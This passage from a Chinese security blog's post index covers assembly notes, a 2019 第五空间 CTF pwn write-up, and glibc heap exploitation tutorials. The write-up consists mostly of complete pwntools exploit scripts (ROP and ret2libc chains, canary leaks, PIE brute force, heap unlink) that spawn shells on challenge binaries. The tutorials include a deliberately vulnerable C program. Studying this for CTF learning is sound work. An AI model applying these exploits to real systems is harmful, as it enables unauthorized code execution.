（78h不是固定的,只是表明可以是立即数）</li><li>整数乘法<br>这一般就是mul和imul了，但是优化会进行改变，如果乘2的次幂较大可能用shl左移指令，同时也可能会用lea指令，类似于上面的加法。</li><li>整数的除法<br>这个一般是div,idiv,除法代价高，大概需要比乘法运算多消耗十倍的CPU时钟，这个的替换类似于乘法，也是当除数是2的幂 的话，无符号尽量用shr,有符号尽量用sar，同时优化的时候尽量会把除法替换成乘法一般就是倒数相乘a/b=a*(1/b)</li></ul><h4 id="文本字符串"><a href="#文本字符串" class="headerlink" title="文本字符串"></a>文本字符串</h4><ul><li>字符串大小写转换:<br>大写字母 41h - 5Ah 小写字母 61h - 7Ah 它们之间的转换方式就是原来ASCII的值+/- 20h<br>还有一种大小写转化方法是基于位操作，我们可以发现二进制表示的时候大写字母A的第五位是0，而小写a的第五位是1，其他可以类推，所以就有以下方式<pre><code>Main    proc near         lea bx, title+!         mov cx,31B20:          mov ah,[bx]          cmp ah,61h          jb B30          cmp ah,7Ah          ja B30          and ah ,1101 1111b  ;and 将ah的第五位指令置0(11011111b = DFh)          mov [bx],ahB30:          inc bx          loop B20          retMain    endp</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 加密与解密 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编知识点</title>
      <link href="/2019/09/17/hui-bian-zhi-shi-dian/"/>
      <url>/2019/09/17/hui-bian-zhi-shi-dian/</url>
      
        <content type="html"><![CDATA[<h4 id="汇编中补码转换"><a href="#汇编中补码转换" class="headerlink" title="汇编中补码转换"></a>汇编中补码转换</h4><p>1.补码可以先减1，然后按位取反。<br>2.从右往左遇见第一个1不变，然后向左按位取反（符号位除外）<br>3.对于16进制数 ：取反的方法就是用15减去改数字中的每一位 ：<br>6A3D –&gt; 95C2+1 –&gt; 95C3 （这只是个例子，正数的话补码和源码相等）</p><h4 id="大小端"><a href="#大小端" class="headerlink" title="大小端"></a>大小端</h4><p>大小端存储对应的是存储器，在寄存器里面没有大小端存储这一说。</p><h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><p>16进制数字取反的方法就是用15减去该数字</p><h4 id="正负数判断"><a href="#正负数判断" class="headerlink" title="正负数判断"></a>正负数判断</h4><p>16进制的补码最高位&gt;=8的话就是负数，否则是整数<br>但是记住，计算机中正数的补码，反码，源码，相同。</p><h4 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h4><img src="/2019/09/17/hui-bian-zhi-shi-dian/1.png" title="This is an image"><img src="/2019/09/17/hui-bian-zhi-shi-dian/2.png" title="This is an image"><p>XCHG ： 交换指令，内容交换</p><p>ADC  EAX,EBX  –&gt; EAX = EAX + EBX + CF</p><p>INC EAX  –&gt; EAX = EAX + 1</p><p>SBB EAX,EBX –&gt; EAX = EAX - EBX - CF</p><p>NEG:取补指令  NEG(neg)   NEG EAX –&gt; 对操作数取补，就是用0减去改操作数 或者 是按位取反 + 1 ，它的操作数可以是寄存器也可以是存储单元，同时改指令可以影响标志寄存器。如果操作数是0，那么进位标志为0，否则进位标志为1。</p><p>shl   shl eax ,cx  –&gt; 将eax中的二进制数字左移cx位，相当于乘上2的cx次方</p><h4 id="标志状态"><a href="#标志状态" class="headerlink" title="标志状态"></a>标志状态</h4><p>CF : 进位标志，运算结果最高位产生进位或者借位的话 CF 置1，否则CF 清0。</p><p>ZF : 零标志位，运算结果为0，则置1，否则置0</p><p>SF ： 符号标志位，跟运算结果的最高位相同</p><p>OF ： 溢出标志位，反映有符号数是否产生了溢出。 判断：符号位和最高数值位一致则未溢出，否则溢出。</p><p>PF : 奇偶标志位，反映最低一个字节中的含有“1”的位数，偶数则被置1，奇数被置0。</p><p>AF ： 辅助进位标志位 ： 反映在算术运算中第三位是否产生进位或者结尾。或者最低的4位是否有借位或者进位。有则置1，否则置0</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019第五空间pwn题解</title>
      <link href="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/"/>
      <url>/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/</url>
      
        <content type="html"><![CDATA[<h3 id="於讴"><a href="#於讴" class="headerlink" title="於讴"></a>於讴</h3><p>首先是一个简单的逆向分析<br><img src="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/1.png" title="This is an image"><br>只要大于或等于1000即可，接下来就是一个很简单的栈溢出的ROP利用：</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#39;debug&#39;r = process(&#39;./pwn&#39;)offset = 0x18r.sendline(&#39;1000&#39;)pop_rdi_ret = 0x0000000000414fc3elf = ELF(&#39;./pwn&#39;)main_addr = 0x0000000004007C3libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]puts_plt = elf.symbols[&#39;puts&#39;]print hex(puts_plt)&#39;&#39;&#39;rop = [    pop_rdi_ret,    libc_start_main_got,    puts_plt,    main_addr,]&#39;&#39;&#39;#gdb.attach(r,&#39;b *0x0000000004007E1\nc&#39;)payload1 = offset * &#39;a&#39; + p64(pop_rdi_ret) + p64(libc_start_main_got) + p64(puts_plt) + p64(main_addr)r.recvuntil(&#39;OH, WHY ARE YOU SO GOOD?\n&#39;)r.sendline(payload1)libc_start_main_addr = u64(r.recvuntil(&#39;\x7f&#39;).ljust(8,&#39;\x00&#39;))print hex(libc_start_main_addr)libc = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_addr)libc_base = libc_start_main_addr - libc.dump(&#39;__libc_start_main&#39;)system_addr = libc_base + libc.dump(&#39;system&#39;)bin_sh_addr = libc_base + libc.dump(&#39;str_bin_sh&#39;)r.sendline(&#39;1001&#39;)payload2 = offset * &#39;a&#39; + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + p64(main_addr)r.recvuntil(&#39;OH, WHY ARE YOU SO GOOD?\n&#39;)r.sendline(payload2)r.interactive()</code></pre><h3 id="副墨"><a href="#副墨" class="headerlink" title="副墨"></a>副墨</h3><p>这个题目保护全开，属实是有点夸张的，但是漏洞也是比较明显吧？<br>首先见面的就是一个伪随机数的碰撞，然后我不得不吐槽一下了，题目给了格式化字符串漏洞，我们可以泄露canary 同时破解pie的保护，但是坑逼的是题目里面的system函数竟然没给’/bin/sh’字符串，而且泄露的时候不知道为啥，最多泄露的长度就是2个’%p’，那就坑逼了，你要重复泄露两次，一次拿到canary + codebase  一次拿到 一个函数的实际地址来泄露libc 进而得到libc里面的 ‘/bin/sh’字符串 。。。属实是需要很长时间的。。。。（我坑逼的调试了一整个下午。。。）<br>值得注意的是：LibcSearcher碰撞出来的libc不全是对的，要换着多执行几次脚本才能getshell啊！</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *from ctypes import *from LibcSearcher import LibcSearcherimport timecontext.log_level=&#39;debug&#39;r = process(&#39;./bf&#39;)name = &#39;%p&#39;name1 = &#39;#%17$p#%18$p&#39;r.sendline(&#39;1&#39;)libc = cdll.LoadLibrary(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)time_now = int(time.time())libc.srand(time_now)r.recvuntil(&#39;your name : \n&#39;)r.sendline(name1)#gdb.attach(r,&#39;b *0x555555554d12\nC&#39;)for i in range(10):    payload = libc.rand() % 0x1869F + 1    r.recvuntil(&#39;Round &#39;+str(i)+&#39; Now guess:&#39;)    r.sendline(str(payload))get1 = r.recv()code1 = hex(int(get1[29:43],16))cookie1 = int(get1[10:28],16)print hex(int(code1,16))print hex(cookie1)codebase = int(code1,16) - 0xd50main_addr = codebase + 0xabfpayload1 = &#39;a&#39; * 0x34 + p64(cookie1) + &#39;a&#39; * 8 +p64(main_addr)r.sendline(payload1)r.recvuntil(&#39;Are you sure want to play the game?\n&#39;)r.sendline(&#39;1&#39;)r.recvuntil(&#39;your name : \n&#39;)gdb.attach(r,&#39;b *0x555555554d12\nC&#39;)r.sendline(name)libc.srand(int(time.time()))for i in range(10):    payload = libc.rand() % 0x1869F + 1    r.recvuntil(&#39;Round &#39;+str(i)+&#39; Now guess:&#39;)    r.sendline(str(payload))get = r.recv()[9:24]_IO_2_1_stdout_addr = int(get,16) - 0x83#code = hex(int(get[10:28],16))#cookie = int(get[10:28],16)#cookie = hex(int(get[29:43],16))#libc_start_main = int(code,16) - 0xf0print &#39;stdout : &#39; +  hex(_IO_2_1_stdout_addr)libc1 = LibcSearcher(&#39;_IO_2_1_stdout_&#39;,_IO_2_1_stdout_addr)libcbase = _IO_2_1_stdout_addr - libc1.dump(&#39;_IO_2_1_stdout_&#39;)system_addr = libcbase + libc1.dump(&#39;system&#39;)print &#39;system_addr : &#39; + hex(system_addr)binsh_addr = libcbase + libc1.dump(&#39;str_bin_sh&#39;)print &#39;binsh_addr : &#39; + hex(binsh_addr)pop_rdi_ret = codebase + 0x0000000000000db3print &#39;pop_rdi_ret : &#39; + hex(pop_rdi_ret)payload1 = &#39;a&#39; * 0x34 + p64(cookie1) + &#39;a&#39; * 8 +p64(pop_rdi_ret)+p64(binsh_addr) +  p64(system_addr) r.sendline(payload1)r.interactive()</code></pre><p>纪念一下：<br>  <img src="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/2.png" title="This is an image"></p><h3 id="坐忘"><a href="#坐忘" class="headerlink" title="坐忘"></a>坐忘</h3><p>这个题目最初看到有malloc第一时间想到的肯定是堆的题目，但是这是个栈上的题目<br><img src="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/3.png" title="This is an image"><br>这里的scanf存在栈溢出，同时puts函数可以帮助我们泄露出栈里面的内容，这就使得canary的保护被成功破解，但是这是个静态编译的文件，我们想到的自然就是构造系统调用的rop来getshell，说实话这个rop的构造算是很复杂的了。。。</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *from base64 import b64encodecontext.log_level = &#39;debug&#39;r = process(&#39;./pwn9&#39;)r.recvuntil(&#39;&gt;\n&#39;)#gdb.attach(r,&#39;b *0x0000000004011AC\nc&#39;)payload1 = &#39;a&#39; * 9r.sendline(b64encode(payload1))r.recvuntil(&#39;aaaaaaaaa&#39;)canary = u64(&#39;\x00&#39;+r.recv(7))print hex(canary)r.recvuntil(&#39;continue ?&#39;)r.sendline(&#39;a&#39;)r.recvuntil(&#39;&gt;\n&#39;)p2 = &#39;&#39;p2 += p64(0x0000000000401f57) # pop rsi ; retp2 += p64(0x00000000006cb080) # @ .datap2 += p64(0x00000000004715e4) # pop rax ; retp2 += &#39;/bin//sh&#39;p2 += p64( 0x000000000047cd21) # mov qword ptr [rsi], rax ; retp2 += p64( 0x0000000000401f57) # pop rsi ; retp2 += p64( 0x00000000006cb088) # @ .data + 8p2 += p64( 0x0000000000426baf) # xor rax, rax ; retp2 += p64( 0x000000000047cd21) # mov qword ptr [rsi], rax ; retp2 += p64( 0x0000000000401e36) # pop rdi ; retp2 += p64( 0x00000000006cb080) # @ .datap2 += p64( 0x0000000000401f57) # pop rsi ; retp2 += p64( 0x00000000006cb088) # @ .data + 8p2 += p64( 0x00000000004433e6) # pop rdx ; retp2 += p64( 0x00000000006cb088) # @ .data + 8p2 += p64( 0x0000000000426baf) # xor rax, rax ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000044d821) # syscallgdb.attach(r,&#39;b *0x0000000004011AC\nc&#39;)payload12 = &#39;a&#39; * 8 + p64(canary) + &#39;a&#39; * 8 + p2r.sendline(b64encode(payload12))r.sendline(&#39;no&#39;)r.interactive()</code></pre><h3 id="拈花"><a href="#拈花" class="headerlink" title="拈花"></a>拈花</h3><p>相比于前面的题目，这个就是新手的练习吧？直接一个栈溢出泄露libc然后执行system，最后getshell ,一套操作行云流水</p><pre><code># coding=utf-8from pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#39;debug&#39;r = process(&#39;./pwn11&#39;)elf = ELF(&#39;./pwn11&#39;)puts_plt = elf.symbols[&#39;puts&#39;]pop_rdi_ret = 0x00000000004012abputs_got = elf.got[&#39;puts&#39;]main_addr = 0x000000000401162offset = 40r.recvuntil(&#39;please input your name\n&#39;)r.sendline(&#39;aaaa&#39;)r.recvuntil(&quot;Let&#39;s start a game,can you guess the key?\n&quot;)#gdb.attach(r)payload1 = offset * &#39;a&#39; + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)r.sendline(payload1)r.recvuntil(&#39;fail!\n&#39;)puts_addr = u64(r.recvuntil(&#39;\n&#39;,drop=True).ljust(8,&#39;\x00&#39;))print hex(puts_addr)libc = LibcSearcher(&#39;puts&#39;,puts_addr)libcbase = puts_addr - libc.dump(&#39;puts&#39;)system_addr = libcbase + libc.dump(&#39;system&#39;)binsh_addr = libcbase + libc.dump(&#39;str_bin_sh&#39;)r.recvuntil(&#39;please input your name\n&#39;)r.sendline(&#39;aaaa&#39;)payload2 = offset * &#39;a&#39; + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)r.recvuntil(&quot;Let&#39;s start a game,can you guess the key?\n&quot;)r.sendline(payload2)r.interactive()</code></pre><h3 id="一苇"><a href="#一苇" class="headerlink" title="一苇"></a>一苇</h3><p>这个题目开了pie但是给了后门，那几本断定是简单的pie爆破了，无奈python水平还好像不太可以，这个脚本可以直接帮助我们getshell , 但是只后你想关这个linux 终端可能必须用鼠标点那个 X 了，用不了快捷键。。。。无语奥。。。谁有更好的办法可以call我啊，当然1/16的几率，手动也可以。</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *import randomoffset = 32 + 8list1 = [&quot;\x0a&quot;,&quot;\x1a&quot;,&quot;\x2a&quot;,&quot;\x3a&quot;,&quot;\x4a&quot;,&quot;\x5a&quot;,&quot;\x6a&quot;,&quot;\x7a&quot;,&quot;\x8a&quot;,&quot;\x9a&quot;,&quot;\xaa&quot;,&quot;\xba&quot;,&quot;\xca&quot;,&quot;\xda&quot;,&quot;\xea&quot;,&quot;\xfa&quot;]while True:    try:        r = process(&#39;./pwn13&#39;)        r.recvuntil(&#39;your choice:&#39;)        r.sendline(&#39;1&#39;)        r.recvuntil(&#39;input massage\n&#39;)        payload = offset * &#39;a&#39; + &#39;\x50&#39; + random.sample(list1,1)[0]        r.sendline(payload)        r.recv()        r.recv()        r.interactive()    except Exception as e:        r.close()        print e</code></pre><h3 id="正定"><a href="#正定" class="headerlink" title="正定"></a>正定</h3><p>这是一个堆的unlink , 从下面可以看出利用的关键所在<br><img src="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/4.png" title="This is an image"></p><p>只要改逻辑就可以了，操作很平常，只不过，最后哪个edit两次属实有点秀了。</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;r = process(&#39;./pwn14&#39;)def malloc(size,text):    r.recvuntil(&#39;Your choice : &#39;)    r.sendline(&#39;1&#39;)    r.recvuntil(&#39;Size of note : &#39;)    r.sendline(str(size))    r.sendafter(&#39;Content of note:&#39;,text)def edit(idx,text,size):    r.recvuntil(&#39;Your choice : &#39;)    r.sendline(&#39;2&#39;)    r.sendlineafter(&#39;Index :&#39;,str(idx))    r.sendlineafter(&#39;Size of note : &#39;,str(text))    r.sendafter(&#39;Content of note : &#39;,size)def delete(idx):    r.recvuntil(&#39;Your choice : &#39;)    r.sendline(&#39;3&#39;)    r.sendlineafter(&#39;Index :&#39;,str(idx))global1 = 0x4040a0list = 0x0000000004040C0malloc(0x20,&#39;aa&#39;) # 0malloc(0x80,&#39;bb&#39;) # 1fake_chunk = [    0x0,0x20,    list - 0x18 ,list - 0x10 ,]payload = flat(fake_chunk) + p64(0x20) + p64(0x90)edit(0,0x40,payload)delete(1)payload = &#39;a&#39; * 24 +p64(0x4040a8)+p64(0x4040a0)edit(0,len(payload),payload)payload = p64(0x7e4)edit(1,len(payload),payload)r.recvuntil(&#39;Your choice : &#39;)r.sendline(&#39;70&#39;)#gdb.attach(r)#edit(0,)r.interactive()</code></pre><h3 id="立雪"><a href="#立雪" class="headerlink" title="立雪"></a>立雪</h3><p>跟上面属实一个题目，不多说了。</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;r = process(&#39;./pwn15&#39;)def new(size,text):    r.sendlineafter(&#39;Your choice:&#39;,&#39;1&#39;)    r.sendlineafter(&#39;Length of note:&#39;,str(size))    r.sendafter(&#39;Content of note:&#39;,text)def edit(idx,size,text):    r.sendlineafter(&#39;Your choice:&#39;,&#39;2&#39;)    r.sendlineafter(&#39;Index:&#39;,str(idx))    r.sendlineafter(&#39;Length of note:&#39;,str(size))    r.sendafter(&#39;Content of note:&#39;,text)def dele(idx):    r.sendlineafter(&#39;Your choice:&#39;,&#39;3&#39;)    r.sendlineafter(&#39;Index:&#39;,str(idx))data = 0x000000000602088ptr = 0x0000000006020C0new(0x20,&#39;aa&#39;)new(0x80,&#39;aa&#39;)fake_chunk = [    0,0x20,    ptr - 0x18,ptr - 0x10,]payload = flat(fake_chunk) + p64(0x20) + p64(0x90)edit(0,len(payload),payload)#gdb.attach(r)dele(1)payload = 0x18 * &#39;a&#39; + p64(data)edit(0,len(payload),payload)edit(0,0x8,p64(0x7e4))r.sendlineafter(&#39;Your choice:&#39;,&#39;2019&#39;)r.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap Fastbin Corruption</title>
      <link href="/2019/08/16/glibc-heap-fastbin-corruption/"/>
      <url>/2019/08/16/glibc-heap-fastbin-corruption/</url>
      
        <content type="html"><![CDATA[<p>基础知识：</p><ul><li>fastbin: Chunk Size &lt;= get_max_fast()的chunk（其实就是64bits的是128bytes，32位的是64bytes）  ，它们会被放在被称为fastbin的bin里面</li></ul><img src="/2019/08/16/glibc-heap-fastbin-corruption/1.png" title="This is an image"><p>上面的fastbinsY 里面存放fastbin , 最大是128bytes,最小是32bytes,然后依次加16bytes,32位的类似，不过最大是64bytes</p><ul><li>需要注意的是get_max_fast()事实上返回的是 global_max_fast，但是这个值得初始值为0，只有当第一次malloc之后它才会被赋值为相应的值</li><li>同时fastbin是Single linked list，所以它只使用fd,以NULL结尾</li><li>free的时候呢，不取消下一个chunk 的prev_inuse bit，因为fastbin chunk不会和其他chunk合并</li><li>malloc 和 free的时候glibc会有一些检查，确认heap metadata是否正确，避免一些可能的攻击方式</li><li>fastbin执行效率高，它的里面的检查比其他类型的bin少很多</li><li>fastbin的linklist和其他的相反，跟Stack很像free和malloc的时候先进后出</li><li>fastbin的prev_inuse标志位在free的时候不会改变还是1，这防止了它和其他的free_chunk进行合并操作</li></ul><p>Fastbin Corruption：</p><pre><code>1..让fastbin linked list 指向任意位置，之后的malloc时就会把改地址当做chunk拿出来 2.free（not in_use）的chunk会被存在bin里面，修改它的fd才会造成corruption    1.double free    2.Over flow</code></pre><p>fastbin的检查方式：</p><ul><li>malloc从bin里面取出chunk,要拿到合适大小的chunk（检查你这个chunk的chunk_size</li><li>free的时候，next_chunk的size必须正确（overflow的时候才会用到）</li><li>free时看看bin里面的第一个chunk和现在要free的是不是同一个（fasttop），这个的缺点就是它只和第一个检查，那么你可以在double free之前先free一个其他的大小合适的chunk</li></ul><p>我们可以看源码了解一下（源码我会的不多，只说点关键的）<br>对应1：</p><pre><code>    //这个nb是chunk的bytes 它来源于上面的一个checked_request2size(bytes,nb) 这的作用就是malloc的bytes+8然后16对齐        if ((unsigned long)(nb) &lt;= (unsigned long)(get_max_fast()))   //chunk的size(nb)小于128 or 64的话就会执行下面        {               idx = fastbin_index(nb);     //这是在fastbin里面找，把chunk的size转换成fastbin里面对应的哪一个（size/16-2）注意：0是fastbin的第一个               mfastbinptr *fb = &amp;fastbin(av, idx);               mchunkptr pp;               victim = *fb;               if (victim != NULL)               {                       if (SINGLE_THREAD_P)                              *fb = victim-&gt;fd;                       else                              REMOVE_FB(fb, pp, victim);                       if (__glibc_likely(victim != NULL))                       {                              size_t victim_idx = fastbin_index(chunksize(victim));   //victim是要等一下要return的chunk                              if (__builtin_expect(victim_idx != idx, 0))      //这边就是在检查你拿出来的chunk的idx跟bin的idx是不是一样，不对的话error                                      malloc_printerr(&quot;malloc(): memory corruption  (fast)&quot;);</code></pre><p>对应2：</p><pre><code>               if (SINGLE_THREAD_P)               {                       /* Check that the top of the bin is not the record we are going to                          add (i.e., double free).  */                       if (__builtin_expect(old == p, 0))   //这个检查就是看看你free的chunk跟bin里面的chunk是不是同一个，同一个的话就error                              malloc_printerr(&quot;double free or corruption (fasttop)&quot;);                       p-&gt;fd = old;                       *fb = p;               }</code></pre><p>double free也会形成类似UAF的效果，可以改掉bin里面的chunk的fd，可以看一下调试截图和源码</p><pre><code>int main(){    void *p,*q,*r,*s;    p = malloc(30);    q = malloc(30);    free(q);    free(p);    free(q); 第一次断点下在这里}</code></pre><img src="/2019/08/16/glibc-heap-fastbin-corruption/2.png" title="This is an image"><img src="/2019/08/16/glibc-heap-fastbin-corruption/3.png" title="This is an image"><img src="/2019/08/16/glibc-heap-fastbin-corruption/4.png" title="This is an image"><p>更重要的是，现在bin里面有两个q（其实是同一块）都指向了P，<br>利用姿势注意点：</p><ol><li><p>取出的chunk 的size要正确，所以也不是任意地址，需要可以制作假的size</p><ol><li>stack上的变量做size ，可以malloc出一个stack上的位置  （可以制作stack上的overflow）</li><li>got上，用64bits地址常见的0x40（这个got没被call过的话）做size</li></ol></li><li><p>取得chunk后，有机会对改地址任意写</p></li></ol><p>fastbin double free:</p><ol><li>fasttop只检查bin里面的第一个chunk,只要不是连续free同一个chunk就没关系</li><li>double free有类似use after free的效果，可以改掉bin里面的chunk的fd</li></ol><p>例子：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;void sh(char *cmd){    system(cmd);}int main(){    setvbuf(stdout,0,_IONBF,0);    int cmd,idx,sz;    char *ptr[10];    memset(ptr,0,sizeof(ptr));    puts(&quot;1. malloc + gets\n2. free\n3. puts&quot;);    while(1)    {        printf(&quot;&gt; &quot;);        scanf(&quot;%d %d&quot;,&amp;cmd, &amp;idx);        idx %= 10;        if(cmd==1)        {            scanf(&quot;%d%*c&quot;,&amp;sz);            ptr[idx] = malloc(sz);            gets(ptr[idx]);        }        else if(cmd==2)        {            free(ptr[idx]);        }        else if(cmd==3)        {            puts(ptr[idx]);        }        else        {            exit(0);        }    }    return 0;}</code></pre><p>在64位机器上这个题目有个经典的手法来必过fastbin的检查，因为malloc必须要拿到合适的chunk,所以你malloc的chunk的size位必须要跟fastbin里面的chunk的size大小相同，我们可以在构造fastbin的时候用到了double free,这个操作就是先随便malloc2个大小一样的chunk p和q（必须是fastbin的大小）,我们一次free p q p，那么就会绕过一个fastbin检测，同时这个double free也会形成一个类似环状的fastbin<br><img src="/2019/08/16/glibc-heap-fastbin-corruption/5.png" title="This is an image"><br>那么在malloc的时候，如果从这个bin里面获取chunk的话，我们就可以通过三次malloc，两次使用chunk p,这样就可以利用gets实现有限制的地址写入，这个限制就来源于chunk大小检查，同样我们可以利用64位机器好多都是0x40,来将malloc的chunk p利用gets修改到got表的相应位置，那么第三次malloc就会把这个地址的内存当做一个chunk来取出来，进行gets，我们写入shell的地址，那么下次调用got表相应函数的时候就直接getshell</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chunk Extend and Overlapping</title>
      <link href="/2019/08/16/chunk-extend-and-overlapping/"/>
      <url>/2019/08/16/chunk-extend-and-overlapping/</url>
      
        <content type="html"><![CDATA[<p>chunk extend 堆利用：<br>    程序中堆的利用 可以控制chunk header中的数据 例如：heap overflow<br>ptmalloc 对chunk 操作的存在漏洞。</p><p>首先：怎么获取chunk的大小？</p><pre><code>/* Get size, ignoring use bits */#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))/* Like chunksize, but do not mask SIZE_BITS.  */#define chunksize_nomask(p) ((p)-&gt;mchunk_size)</code></pre><p>其实就是利用了size , 但是一种忽略了掩码部分，一种没有。</p><p>那么怎么获取下一个chunk的位置？<br>这个其实就是利用了隐式链表的技术</p><pre><code>/* Ptr to next physical malloc_chunk. */#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</code></pre><p>就是当前块指针加上当前块的大小。</p><p>那么有关前一个chunk的信息呢？<br>答案还在malloc_chunk的结构体里面，</p><pre><code>/* Size of the chunk below P.  Only valid if prev_inuse (P).  */#define prev_size(p) ((p)-&gt;mchunk_prev_size)/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</code></pre><p>但是这一点的时候要特别注意malloc 和free两种不同的状态。<br>上面简单就是用本chunk - malloc_chunk-&gt;prev_size<br>那么判断是否处于in_use状态就是依靠in_use标志位了</p><pre><code>#define inuse(p)    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</code></pre><p>记住一点：本chunk的 in_use表示的是前一个chunk的状态哦。<br>综合起来chunk的判断 就是依赖于malloc_chunk结构体里面的内容，简单来说就是chunk_header<br>,那么利用思路就自然而然的出来了，我们通过堆漏洞（heap overflow之类的）可以改变chunk_header进而实现漏洞利用</p><p>下面来几个简单的实操：<br>    1.在fastbin 里面的操作：</p><pre><code>/*************************************************************************    &gt; File Name: chunk_extend.c    &gt; Author: 时钟    &gt; Mail: 522796871@qq.com    &gt; Created Time: 2019年08月16日 星期五 11时30分15秒 ************************************************************************/#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){    void *p , *c;    p = malloc(0x10);    malloc(0x10);    *(long long*)((long long)p-0x8) = 0x41;    free(p);    c = malloc(0x32);    return 0;}</code></pre><p>当我们free之后：<br><img src="/2019/08/16/chunk-extend-and-overlapping/1.png" title="This is an image"><br>这接下来的malloc 就可以成功的控制下面的malloc ， 相当于两个指针可以操作同一个chunk了哦。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
